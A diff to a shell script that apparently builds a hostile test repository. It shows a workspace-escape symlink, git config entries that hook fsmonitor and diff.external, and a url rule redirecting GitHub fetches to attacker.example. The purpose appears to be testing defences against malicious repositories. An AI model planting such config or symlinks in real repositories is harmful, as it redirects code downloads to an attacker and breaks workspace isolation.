@@ -72,4 +72,14 @@ ln -s "${OUTSIDE}" "${REPO}/home-escape"
 git add home-escape
 git commit -m "attack: add workspace escape symlink"
 
+# MCB-01 vectors for lane A AP1.4b — hostile .git/config entries.
+cat >>"${REPO}/.git/config" <<CFG
+
+[core]
+	fsmonitor = /bin/false
+	diff.external = /bin/false
+[url "https://attacker.example/"]
+	insteadOf = https://github.com/
+CFG
+
 echo "built ${REPO}"
